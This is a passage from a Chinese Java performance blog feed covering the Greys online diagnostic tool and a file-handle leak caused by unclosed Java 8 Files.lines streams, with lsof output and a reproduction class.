<h4 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h4><p>stackå¯ä»¥äº§å“æŒ‡å®šæ–¹æ³•è°ƒç”¨çš„stackï¼Œ æ”¯æŒæ­£åˆ™ï¼Œ ä¹Ÿæ”¯æŒå„ç§æ¡ä»¶è¡¨è¾¾å¼ï¼Œå…·ä½“å¯ä»¥<code>help stack</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;stack -n 1  *com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener onMessage </span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 111 ms.</span><br><span class="line">thread_name=&quot;anon-com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.&lt;clinit&gt;:33-thread-6&quot; thread_id=0x20e;is_daemon=true;priority=5;</span><br><span class="line">    @com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.onMessage(BookingPromotionRollBackListener.java:-1)</span><br><span class="line">        at qunar.tc.qmq.consumer.handler.ConsumerMessage.process(ConsumerMessage.java:105)</span><br><span class="line">        at qunar.tc.qmq.consumer.handler.MessageHandler$1.run(MessageHandler.java:57)</span><br><span class="line">        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)</span><br><span class="line">        at java.util.concurrent.FutureTask.run(FutureTask.java:262)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:744)</span><br></pre></td></tr></table></figure>
<p><em>æ³¨æ„æœ€å¥½æŒ‡å®šä¸‹-nå‚æ•°ï¼Œä»¥å…å¯¹çº¿ä¸Šç³»ç»Ÿé€ æˆè¾ƒå¤§çš„å‹åŠ›</em></p>
<h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><p>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„ç”¨æ³•ï¼Œæ¯”å¦‚æ”¯æŒä½¿ç”¨jsç¼–å†™è‡ªå®šä¹‰çš„è„šæœ¬ï¼Œ æŸ¥çœ‹jvmçš„ä¿¡æ¯ï¼Œ æŸ¥çœ‹åŠ è½½çš„ç±»ç­‰ç­‰ã€‚</p>
<h3 id="å®‰å…¨æ€§"><a href="#å®‰å…¨æ€§" class="headerlink" title="å®‰å…¨æ€§"></a>å®‰å…¨æ€§</h3><blockquote>
<p>ï¼ˆ1ï¼‰ å“ªäº›å‘½ä»¤ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜</p>
</blockquote>
<p>Greysçš„å¤§éƒ¨åˆ†å‘½ä»¤æ€§èƒ½å¼€é”€éƒ½éå¸¸ä½å»‰ï¼Œå½“ç„¶å‰ææ˜¯ä¸€æ¬¡æ€§æ“ä½œçš„ç±»ä¸è¦å¤ªå¤šã€‚</p>
<blockquote>
<p>ï¼ˆ2ï¼‰ æ˜¯å¦èƒ½å¢å¼ºç”±BootstrapClassLoaderæ‰€åŠ è½½çš„ç±»</p>
</blockquote>
<p>å½“ç„¶æ˜¯å¯ä»¥çš„ï¼Œä½†é»˜è®¤æˆ‘å°å°äº†è¿™ä¸ªèƒ½åŠ›ã€‚ä¸»è¦æ˜¯Greysè‡ªå·±ä¹Ÿä½¿ç”¨äº†å¤§é‡BootstrapClassLoaderæ‰€åŠ è½½çš„ç±»ï¼Œå¦‚æœå¤„ç†ä¸å¥½æå…¶å®¹æ˜“é€ æˆæ•…éšœã€‚</p>
<p>ä½ å¯ä»¥é€šè¿‡éšè—å‘½ä»¤optionsæ¿€æ´»è¿™ä¸ªåŠŸèƒ½</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;options unsafe true</span><br><span class="line">+--------+--------------+-------------+</span><br><span class="line">| NAME   | BEFORE-VALUE | AFTER-VALUE |</span><br><span class="line">+--------+--------------+-------------+</span><br><span class="line">| unsafe | false        | true        |</span><br><span class="line">+--------+--------------+-------------+</span><br><span class="line">Affect(row-cnt:1) cost in 2 ms.</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥ä½ å¯ä»¥å°è¯•å¢å¼ºç³»ç»Ÿç±»äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;monitor -c 5 java.lang.String substring</span><br><span class="line">Press Ctrl+D or Ctrl+X to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:2) cost in 35 ms.</span><br><span class="line">+---------------------+------------------+-----------+-------+---------+------+------+-----------+</span><br><span class="line">| timestamp           | class            | method    | total | success | fail | rt   | fail-rate |</span><br><span class="line">+---------------------+------------------+-----------+-------+---------+------+------+-----------+</span><br><span class="line">| 2015-06-16 23:44:54 | java.lang.String | substring | 30    | 30      | 0    | 0.23 | 0.00%     |</span><br><span class="line">+---------------------+------------------+-----------+-------+---------+------+------+-----------+</span><br></pre></td></tr></table></figure>
<p>ä½†æˆ‘è¯å°±æ”¾åœ¨è¿™é‡Œï¼Œéšæ„å¢å¼ºç³»ç»Ÿç±»ã€‚åæœè‡ªè´Ÿï¼</p>
<h3 id="greys-é€€å‡º"><a href="#greys-é€€å‡º" class="headerlink" title="greys é€€å‡º"></a>greys é€€å‡º</h3><p>greysçš„æ•°æ®æ˜¯ä¿å­˜åœ¨å†…å­˜ä¸­çš„ï¼Œ æœ‰äº›è®°å½•çš„æ ˆæ¡¢éœ€è¦æ¸…ç†ï¼Œå› æ­¤æ¨èä½¿ç”¨<code>shutdown</code>æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;tt -l</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1001 |       1002 |  2017-11-12 17:30:40 |         20 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1002 |       1003 |  2017-11-12 17:30:41 |         10 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1003 |       1004 |  2017-11-12 17:37:27 |         10 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1004 |       1005 |  2017-11-12 17:43:15 |          2 |     true |    false |      0x14b7937c | BookingPromotionRollBackListen |                      onMessage |</span><br><span class="line">|          |            |                      |            |          |          |                 |                             er |                                |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br></pre></td></tr></table></figure>
<p>è¿™äº›æ—¶é—´ç‰‡é»˜è®¤æ˜¯ä¿å­˜çš„ï¼Œæ‰€ä»¥é€€å‡ºçš„æ—¶å€™éœ€è¦æ¸…ç†ä¸‹ï¼Œä¸ç„¶å¯¹åº”ç”¨çš„gcéƒ½ä¼šæœ‰å½±å“ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;shutdown</span><br><span class="line">Greys Server is shut down.</span><br></pre></td></tr></table></figure>
<p>greys è¿˜æä¾›äº†ä¸€ä¸ª<code>reset</code>çš„å‘½ä»¤ï¼Œå¯ä»¥è¿˜åŸæ‰€æœ‰è¢«å¢å¼ºè¿‡çš„ç±»ã€‚</p>
<blockquote>
<p>  reset : Reset all the enhanced classes</p>
</blockquote>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="https://github.com/oldmanpushcart/greys-anatomy/wiki/greys-pdf" rel="external nofollow noopener noreferrer" target="_blank">greys pdf Â· oldmanpushcart/greys-anatomy Wiki</a></p>
</li>
<li><p><a href="http://www.bijishequ.com/detail/435931?p=29-55" rel="external nofollow noopener noreferrer" target="_blank">Grays Anatomyæºç æµ…æâ€“ClassLoader,Java,Method,DES,null,æ–¹æ³•,INVOKING</a></p>
</li>
<li><p><a href="https://github.com/oldmanpushcart/greys-anatomy/wiki/FAQ" rel="external nofollow noopener noreferrer" target="_blank">FAQ Â· oldmanpushcart/greys-anatomy Wiki</a></p>
</li>
<li><p><a href="http://hongkaiwen.github.io/2017/07/22/java-%E7%BA%BF%E4%B8%8A%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7-greys-anatomy-%E5%AE%9E%E8%B7%B5%E5%88%9D%E6%8E%A2/index.html" rel="external nofollow noopener noreferrer" target="_blank">java çº¿ä¸Šè°ƒè¯•å·¥å…· greys-anatomy å®è·µåˆæ¢ | Kuzan</a></p>
</li>
<li><p><a href="http://calvin1978.blogcn.com/articles/btrace1.html" rel="external nofollow noopener noreferrer" target="_blank">Btraceå…¥é—¨åˆ°ç†Ÿç»ƒå°å·¥å®Œå…¨æŒ‡å— | æ±Ÿå—ç™½è¡£</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5NzMyMjAwMA==&amp;mid=2651478959&amp;idx=2&amp;sn=25bac2f47851c436f27c679e77e892ae&amp;chksm=bd2537d08a52bec6d5987b98e885d5b466569a7ba621a5e93297a5490ebd2ea75a04c7b51d47&amp;mpshare=1&amp;scene=1&amp;srcid=09056wNl5ibsbHVZNqBGAT8w#rd" rel="external nofollow noopener noreferrer" target="_blank">çº¿ä¸ŠæœåŠ¡ CPU 100%ï¼Ÿä¸€é”®å®šä½ so easyï¼</a></p>
</li>
<li><p><a href="https://github.com/CSUG/HouseMD/wiki/UserGuideCN" rel="external nofollow noopener noreferrer" target="_blank">UserGuideCN Â· CSUG/HouseMD Wiki</a></p>
</li>
<li><p><a href="https://github.com/superhj1987/awesome-scripts" rel="external nofollow noopener noreferrer" target="_blank">superhj1987/awesome-scripts: useful scripts for Linux op</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> perf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> greys </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java8 Streamä½¿ç”¨ä¸å½“ï¼Œå¯¼è‡´æ–‡ä»¶æ²¡æœ‰å…³é—­]]></title>
      <url>http://qsli.github.io/2017/11/04/java8-file-stream/</url>
      <content type="html"><![CDATA[<h2 id="ç°è±¡"><a href="#ç°è±¡" class="headerlink" title="ç°è±¡"></a>ç°è±¡</h2><p>çº¿ä¸Šå·¡æŸ¥çš„æ—¶å€™ï¼Œæ£€æŸ¥äº†çº¿ä¸Šæœºå™¨çš„<code>tomcat</code>æ‰“å¼€çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå‘ç°äº†ä¸€äº›é—®é¢˜ã€‚<br>ä¸€èˆ¬æ¥è¯´ï¼Œtomcatæ‰“å¼€çš„æ–‡ä»¶å°±æ˜¯ä¸€äº›<code>jar</code>åŒ…ï¼Œæ—¥å¿—æ–‡ä»¶, åŠ¨æ€åº“ï¼Œsocketç­‰ã€‚å› æ­¤ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹ä¸‹tomcatæ‰“å¼€çš„æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p <span class="variable">$pid</span> | grep / | grep -v <span class="string">".jar"</span> | grep -v <span class="string">".so"</span></span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">COMMAND   PID   USER   FD   TYPE             DEVICE  SIZE/OFF      NODE NAME</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  cwd    DIR              252,2      4096    136416 /tmp/hsperfdata_tomcat</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  rtd    DIR              252,2      4096         2 /</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  mem    REG              252,2  99158576     19559 /usr/lib/locale/locale-archive</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  mem    REG              252,2     32768    131740 /tmp/hsperfdata_tomcat/25516</span><br><span class="line"></span><br><span class="line">java    25516 tomcat    0r   CHR                1,3       0t0      3674 /dev/null</span><br><span class="line"></span><br><span class="line">java    25516 tomcat    1w   REG              252,7  16965016   1836324 /logs/catalina.out</span><br><span class="line"></span><br><span class="line">java    25516 tomcat    2w   REG              252,7  16965016   1836324 /logs/catalina.out</span><br><span class="line"></span><br><span class="line">java    25516 tomcat    3w   REG              252,7   7839644   1836499 /logs/gc-201710181632.log</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   10w   REG              252,7   2741011   1835201 /logs/catalina.2017-10-18.log (deleted)</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   11w   REG              252,7      1494   1835054 /logs/localhost.2017-10-18.log (deleted)</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   40r   CHR                1,8       0t0      3678 /dev/random</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   41r   CHR                1,9       0t0      3679 /dev/urandom</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   42r   CHR                1,8       0t0      3678 /dev/random</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   43r   CHR                1,8       0t0      3678 /dev/random</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   44r   CHR                1,9       0t0      3679 /dev/urandom</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   45r   CHR                1,9       0t0      3679 /dev/urandom</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   52w   REG              252,7   7409504   1836890 /logs/access.2017-10-19.log</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   65r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   68r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   72r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   82r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  180r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  193r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  197r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  200r   REG              252,7  44315261   1836448 /logs/dubbo-access-provider.2017-10-19-13.log</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  204r   REG              252,7 181402005   1836417 /logs/dubbo-access-consumer.2017-10-19-13.log</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  224r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  363r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  365r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  573r   CHR                1,8       0t0      3678 /dev/random</span><br></pre></td></tr></table></figure>
<p>ä»æ–‡ä»¶åˆ—è¡¨ä¸­å¯ä»¥çœ‹å‡ºæ—¥å¿—æ–‡ä»¶æ˜¯ä¸€ç›´æ‰“å¼€çš„ï¼Œè¿™ä¸ªæ˜¯æ­£å¸¸çš„ï¼Œå› ä¸ºéœ€è¦å†™å…¥æ—¥å¿—ã€‚<br>ä½†æ˜¯è¿˜æœ‰ä¸€äº›å…¶ä»–çš„æ–‡ä»¶ï¼Œä¸éœ€è¦å†™å…¥ï¼Œä¹Ÿä¸€ç›´æ‰“å¼€ï¼Œè€Œä¸”æœ‰çš„æ‰“å¼€äº†å¥½å‡ æ¬¡ï¼Œè¿™ä¸ªå°±çœ‹èµ·æ¥æœ‰é—®é¢˜äº†ã€‚</p>
<p>ç¿»ä»£ç ï¼Œ å‘ç°è¿™ä¸ªæ–‡ä»¶æ˜¯å®šæ—¶æ‹‰å–çš„é€»è¾‘ï¼Œæ¯æ¬¡ä»æ•°æ®æºæ‹‰ä¸€ä»½æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œ ç„¶åç”¨java8çš„<code>Files.lines</code>å’Œlambdaè¿›è¡Œå¤„ç†ã€‚<br>ä¸‹é¢å¤§æ¦‚å¤ç°äº†ç›¸å…³çš„é€»è¾‘ã€‚</p>
<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.air.collection.java8.stream.file;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Lists;</span><br><span class="line"><span class="keyword">import</span> com.google.common.io.Resources;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ScheduledExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.stream.Collectors.toList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> qisheng.li</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> qisheng.li@qunar.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 17-11-4 ä¸‹åˆ5:07</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FilesTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ScheduledExecutorService executor = Executors.newScheduledThreadPool(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, URISyntaxException, InterruptedException </span>&#123;</span><br><span class="line">        executor.scheduleAtFixedRate(FilesTest::reloadFile, <span class="number">100</span>, <span class="number">1000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reloadFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"reload file"</span>);</span><br><span class="line">        List&lt;Integer&gt; collect = Lists.newArrayList();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            collect = Files.lines(Paths.get(Resources.getResource(<span class="string">"test.json"</span>).toURI()))</span><br><span class="line">                    .map(String::length)</span><br><span class="line">                    .collect(toList());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">            System.out.println(collect.get(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€å †çš„<code>test.json</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">java    23757 qishengli 8822r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8823r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8824r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8825r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8826r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8827r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8828r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8829r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8830r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8831r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8832r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8833r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8834r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8835r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br></pre></td></tr></table></figure>
<p>å®Œç¾å¤ç°ï¼</p>
<h2 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h2><blockquote>
<p>Streams have a BaseStream.close() method and implement AutoCloseable, but nearly all stream instances do not actually need to be closed after use. </p>
</blockquote>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œå¹¶ä¸éœ€è¦æ‰‹åŠ¨è°ƒç”¨<code>Stream</code>çš„<code>close</code>æ–¹æ³•ï¼Œ åªæœ‰èƒŒåæ˜¯I/Oç›¸å…³çš„æµæ‰éœ€è¦æ‰‹åŠ¨å…³é—­ã€‚</p>
<blockquote>
<p>Generally, only streams whose source is an IO channel (such as those returned by Files.lines(Path, Charset)) will require closing. Most streams are backed by collections, arrays, or generating functions, which require no special resource management. (If a stream does require closing, it can be declared as a resource in a try-with-resources statement.)</p>
</blockquote>
<p>æŸ¥æ‰¾åˆ°æ‰“å¼€ç›¸åº”æ–‡ä»¶çš„ä»£ç ï¼Œå‘ç°ä½¿ç”¨çš„æ­£æ˜¯java8çš„<code>Files.lines</code>æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å¹¶ä¸ä¼šè‡ªåŠ¨çš„å°†æ–‡ä»¶å…³é—­ï¼Œæ‰€ä»¥å°±ä¼šçœ‹åˆ°ï¼Œtomcatè¿›ç¨‹å¤šæ¬¡æ‰“å¼€äº†åŒä¸€ä¸ªæ–‡ä»¶ã€‚</p>
<p><code>Files.lines</code>æ–¹æ³•çš„å‡½æ•°è¯´æ˜å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read all lines from a file as a &#123;<span class="doctag">@code</span> Stream&#125;. Unlike &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment">     * #readAllLines(Path, Charset) readAllLines&#125;, this method does not read</span></span><br><span class="line"><span class="comment">     * all lines into a &#123;<span class="doctag">@code</span> List&#125;, but instead populates lazily as the stream</span></span><br><span class="line"><span class="comment">     * is consumed.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt; Bytes from the file are decoded into characters using the specified</span></span><br><span class="line"><span class="comment">     * charset and the same line terminators as specified by &#123;<span class="doctag">@code</span></span></span><br><span class="line"><span class="comment">     * readAllLines&#125; are supported.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt; After this method returns, then any subsequent I/O exception that</span></span><br><span class="line"><span class="comment">     * occurs while 